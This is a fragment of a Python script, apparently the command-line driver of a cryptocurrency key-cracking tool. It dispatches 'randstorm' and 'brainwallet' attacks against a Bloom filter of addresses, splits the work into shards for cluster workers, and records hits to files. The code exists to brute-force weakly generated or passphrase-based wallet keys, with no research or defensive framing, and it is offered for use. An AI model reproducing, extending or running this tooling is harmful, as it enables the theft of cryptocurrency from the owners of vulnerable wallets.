    ap.add_argument("--worker", choices=["randstorm", "brainwallet"],
                    help="run a single shard of an attack and exit (cluster worker mode)")
    ap.add_argument("--shard", metavar="IDX/N", help="0-based shard index / total shards, e.g. 3/10")
    ap.add_argument("--wordlist", help="passphrase file for --worker brainwallet")
    args = ap.parse_args()

    if args.build_bloom:
        build_bloom(print); sys.exit(0)

    if args.cli_randstorm:
        if not BLOOM_PATH.exists():
            sys.exit("run --build-bloom first")
        bf = BloomFilter.load(BLOOM_PATH)
        attack_randstorm(args.cli_randstorm[0], args.cli_randstorm[1],
                         bf, print, {"stop": False, "progress": 0, "detail": ""})
        sys.exit(0)

    if args.worker:
        if not args.shard or "/" not in args.shard:
            sys.exit("--worker requires --shard IDX/N (e.g. --shard 3/10)")
        try:
            idx, n = (int(x) for x in args.shard.split("/", 1))
        except ValueError:
            sys.exit("--shard must look like IDX/N (e.g. 3/10)")
        if not (0 <= idx < n) or n < 1:
            sys.exit(f"shard index {idx} out of range for {n} shards")
        if not BLOOM_PATH.exists():
            sys.exit("bloom not found — run --build-bloom first "
                     "(or point DISK_PATH at the node's data dir)")
        bf = BloomFilter.load(BLOOM_PATH)
        hits_path = DATA_DIR / f"hits_shard{idx}_of_{n}.jsonl"
        _HITS_FILE = open(hits_path, "a", encoding="utf-8")
        job = {"stop": False, "progress": 0, "detail": ""}
        if args.worker == "randstorm":
            s, e = _shard_range(GENESIS_TS, CUTOFF_TS, idx, n)
            print(f"[worker] randstorm shard {idx+1}/{n}: {s}..{e}", flush=True)
            attack_randstorm(s, e, bf, print, job)
        else:
            if not args.wordlist:
                sys.exit("--worker brainwallet requires --wordlist FILE")
            with open(args.wordlist, encoding="utf-8", errors="ignore") as f:
                pws = [l.rstrip("\n") for l in f if l.strip()]
            shard = pws[idx::n]
            print(f"[worker] brainwallet shard {idx+1}/{n}: "
                  f"{len(shard):,}/{len(pws):,} passphrases", flush=True)
            attack_brainwallet(shard, bf, print, job)
        _HITS_FILE.close()
        print(f"[worker] done — hits appended to {hits_path}", flush=True)
        sys.exit(0)

    app.run(host="0.0.0.0", port=args.port, debug=False)